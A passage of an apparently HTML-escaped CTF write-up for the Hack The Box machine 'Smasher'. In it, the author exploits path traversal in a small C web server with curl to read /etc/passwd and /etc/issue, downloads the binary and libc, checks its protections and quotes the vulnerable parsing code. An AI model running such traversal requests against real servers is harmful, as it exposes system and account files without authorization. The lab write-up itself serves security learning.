style=&quot;color:#bf616a;&quot;&gt;a&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;center&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&amp;lt;!-- End Btn --&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;div&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&amp;lt;!-- End Box --&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;form&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;p&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;For security reasons this server will be restarted every 60 seconds!!!&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;p&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;script &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;src&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&#x2F;&#x2F;ajax.googleapis.com&#x2F;ajax&#x2F;libs&#x2F;jquery&#x2F;1.9.0&#x2F;jquery.min.js&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;type&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;text&#x2F;javascript&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&amp;gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;script&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Looks like a dead end with a fake login form. Form action posts data to index.php, which doesn&#x27;t exist on server. So, we have to look somewhere else.&lt;&#x2F;p&gt;
+&lt;p&gt;Few minutes of checking around with gobuster gave me interesting insight by hitting points like &#x2F;&#x2F;..&#x2F;&#x2F;&#x2F;&#x2F;..&#x2F;etc&#x2F;, i found this interesting&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;[badarg:~&#x2F;ctf&#x2F;hackthebox&#x2F;box&#x2F;Smasher]$&lt;&#x2F;span&gt;&lt;span&gt; curl http:&#x2F;&#x2F;10.10.10.89:1111&#x2F;&#x2F;etc&#x2F;passwd
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;list:x:38:38:Mailing&lt;&#x2F;span&gt;&lt;span&gt; List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;gnats:x:41:41:Gnats&lt;&#x2F;span&gt;&lt;span&gt; Bug-Reporting System (admin)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;:&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;systemd-timesync:x:100:102:systemd&lt;&#x2F;span&gt;&lt;span&gt; Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;false
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;systemd-network:x:101:103:systemd&lt;&#x2F;span&gt;&lt;span&gt; Network Management,,,:&#x2F;run&#x2F;systemd&#x2F;netif:&#x2F;bin&#x2F;false
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;systemd-resolve:x:102:104:systemd&lt;&#x2F;span&gt;&lt;span&gt; Resolver,,,:&#x2F;run&#x2F;systemd&#x2F;resolve:&#x2F;bin&#x2F;false
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;systemd-bus-proxy:x:103:105:systemd&lt;&#x2F;span&gt;&lt;span&gt; Bus Proxy,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;false
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;syslog:x:104:108::&#x2F;home&#x2F;syslog:&#x2F;bin&#x2F;false
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;_apt:x:105:65534::&#x2F;nonexistent:&#x2F;bin&#x2F;false
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;messagebus:x:106:110::&#x2F;var&#x2F;run&#x2F;dbus:&#x2F;bin&#x2F;false
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;uuidd:x:107:111::&#x2F;run&#x2F;uuidd:&#x2F;bin&#x2F;false
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;sshd:x:108:65534::&#x2F;var&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;www:x:1000:1000:www,,,:&#x2F;home&#x2F;www:&#x2F;bin&#x2F;bash
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;smasher:x:1001:1001:,,,:&#x2F;home&#x2F;smasher:&#x2F;bin&#x2F;bash
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;This is Path Traversal vulnerability in servers code. Nice, but what can we do with it?
+I&#x27;ll cut all my failed searches and ideas, in the end i found actual http server code and binary (Yaaay!)&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;[badarg:~&#x2F;ctf&#x2F;hackthebox&#x2F;box&#x2F;Smasher]$&lt;&#x2F;span&gt;&lt;span&gt; curl http:&#x2F;&#x2F;10.10.10.89:1111&#x2F;&#x2F;home&#x2F;www&#x2F;tiny-web-server&#x2F; | &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;sed -e &lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;s&#x2F;&amp;lt;[^&amp;gt;]*&amp;gt;&#x2F;&#x2F;g&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;.git&#x2F;2018-03-31&lt;&#x2F;span&gt;&lt;span&gt; 00:57&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span&gt;DIR&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;]
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;public_html&#x2F;2018-03-31&lt;&#x2F;span&gt;&lt;span&gt; 00:57&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span&gt;DIR&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;]
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;tiny.c2018-03-31&lt;&#x2F;span&gt;&lt;span&gt; 00:5713.2K
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;README.md2018-03-31&lt;&#x2F;span&gt;&lt;span&gt; 00:571.0K
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;tiny2018-03-31&lt;&#x2F;span&gt;&lt;span&gt; 00:5744.4K
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Makefile2018-03-31&lt;&#x2F;span&gt;&lt;span&gt; 00:57175
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Downloaded all of them. Great thing is that we have actual source code, which will speed up the whole process. Next i wanted to see, because i knew what my target was, is ASLR on the server enabled, and what can i do about it?&lt;&#x2F;p&gt;
+&lt;p&gt;First, i&#x27;ve checked version of the system:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;[badarg:~&#x2F;ctf&#x2F;hackthebox&#x2F;box&#x2F;Smasher]$&lt;&#x2F;span&gt;&lt;span&gt; curl http:&#x2F;&#x2F;10.10.10.89:1111&#x2F;&#x2F;etc&#x2F;issue
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Ubuntu&lt;&#x2F;span&gt;&lt;span&gt; 16.04.4 LTS &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n \l
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;After that i tried to read &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space, and for some reason ( permissions) i couldn&#x27;t read that file.
+So i assumed the worst, and tried to get libc.so.6 so i can use it later.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;wget&lt;&#x2F;span&gt;&lt;span&gt; http:&#x2F;&#x2F;10.10.10.89:1111&#x2F;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;So, now, what i usually like to do is, identify version of libc, in this case i&#x27;ve had access to &#x2F;etc&#x2F;issue so i already know, i procceded futher to get docker container with radare2, ropper, pwndbg and libc-database, and few other tools, up and running on Ubuntu 16.04 x64.
+Let&#x27;s start analysing tiny file, which is the binary for web server.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;root@--name:&#x2F;ctf&#x2F;work$&lt;&#x2F;span&gt;&lt;span&gt; file tiny
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;tiny:&lt;&#x2F;span&gt;&lt;span&gt; ELF 64-bit LSB executable, x86-64, version 1 (SYSV)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, for GNU&#x2F;Linux 2.6.32, BuildID&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span&gt;sha1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;]&lt;&#x2F;span&gt;&lt;span&gt;=b872377623aa9e081bc7d72c8dbe882f03bf66b7, not stripped
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;root@--name:&#x2F;ctf&#x2F;work$&lt;&#x2F;span&gt;&lt;span&gt; ldd tiny
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;linux-vdso.so.1&lt;&#x2F;span&gt;&lt;span&gt; =&amp;gt;  (0x00007ffc7b9a4000)
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;libc.so.6&lt;&#x2F;span&gt;&lt;span&gt; =&amp;gt; &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6 (0x00007f846ddf0000)
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;&#x2F;lib64&#x2F;ld-linux-x86-64.so.2&lt;&#x2F;span&gt;&lt;span&gt; (0x00007f846e1ba000)
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Not stripped, huray.&lt;&#x2F;p&gt;
+&lt;p&gt;I&#x27;ve checked strings, as usual, but didn&#x27;t saw nothing specialy useful. Except maybe this one:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;GNU&lt;&#x2F;span&gt;&lt;span&gt; C99 5.4.0 20160609&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -mtune&lt;&#x2F;span&gt;&lt;span&gt;=generic&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -march&lt;&#x2F;span&gt;&lt;span&gt;=x86-64&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -g -O2 -std&lt;&#x2F;span&gt;&lt;span&gt;=c99&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -fno-stack-protector
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;NX is disabled, if you are to belive this one -fno-stack-protector, so i checked.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;root@--name:&#x2F;ctf&#x2F;work#&lt;&#x2F;span&gt;&lt;span&gt; gdb&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -q&lt;&#x2F;span&gt;&lt;span&gt; tiny
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Reading&lt;&#x2F;span&gt;&lt;span&gt; symbols from tiny...done.
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pwndbg&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt; checksec
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;[*] &lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&#x2F;ctf&#x2F;work&#x2F;tiny&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Arch:&lt;&#x2F;span&gt;&lt;span&gt;     amd64-64-little
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;RELRO:&lt;&#x2F;span&gt;&lt;span&gt;    Partial RELRO
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Stack:&lt;&#x2F;span&gt;&lt;span&gt;    No canary found
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;NX:&lt;&#x2F;span&gt;&lt;span&gt;       NX disabled
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;PIE:&lt;&#x2F;span&gt;&lt;span&gt;      No PIE (0x400000)
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;RWX:&lt;&#x2F;span&gt;&lt;span&gt;      Has RWX segments
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;FORTIFY:&lt;&#x2F;span&gt;&lt;span&gt;  Enabled
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pwndbg&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt; 
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Yup, looks like only ASLR is enabled.
+So let&#x27;s take a step back, and check on tiny.c source code.
+If we take a look at our first vuln on this box, which was directory traversal, you can locate line responsive for it in function parse_request()&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;c&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;char&lt;&#x2F;span&gt;&lt;span&gt;* filename = uri;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span&gt;(uri[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;] == &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;){
+&lt;&#x2F;span&gt;&lt;span&gt;    filename = uri + &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt; length = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;strlen&lt;&#x2F;span&gt;&lt;span&gt;(filename);
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(length == &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;){
+&lt;&#x2F;span&gt;&lt;span&gt;        filename = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;;
+&lt;&#x2F;span&gt;&lt;span&gt;    } &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;else &lt;&#x2F;span&gt;&lt;span&gt;{
+&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt; i = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;; i &amp;lt; length; ++ i) {
+&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(filename[i] == &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;?&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;) {
+&lt;&#x2F;span&gt;&lt;span&gt;                filename[i] = &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\0&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;;
+&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;break&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;            }
+&lt;&#x2F;span&gt;&lt;span&gt;        }
+&lt;&#x2F;span&gt;&lt;span&gt;    }
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;url_decode&lt;&#x2F;span&gt;&lt;span&gt;(filename, req-&amp;gt;filename, MAXLINE);
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;You can see that uri[0] doesn&#x27;t have any real check for directory lookup&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;c&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span&gt;(uri[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;] == &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;){
+&lt;&#x2F;span&gt;&lt;span&gt;    filename = uri + &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt; length = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;strlen&lt;&#x2F;span&gt;&lt;span&gt;(filename);
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;After filename gets sorted here, it is passed to url_decode(), which is a simple little method:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;c&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;void &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;url_decode&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;char&lt;&#x2F;span&gt;&lt;span&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;src&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;char&lt;&#x2F;span&gt;&lt;span&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;dest&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;max&lt;&#x2F;span&gt;&lt;span&gt;) {
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;char &lt;&#x2F;span&gt;&lt;span&gt;*p = src;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;char&lt;&#x2F;span&gt;&lt;span&gt; code[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;] = { &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0 &lt;&#x2F;span&gt;&lt;span&gt;};
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;while&lt;&#x2F;span&gt;&lt;span&gt;(*p &amp;amp;&amp;amp; --max) {
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span&gt;(*p == &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;) {
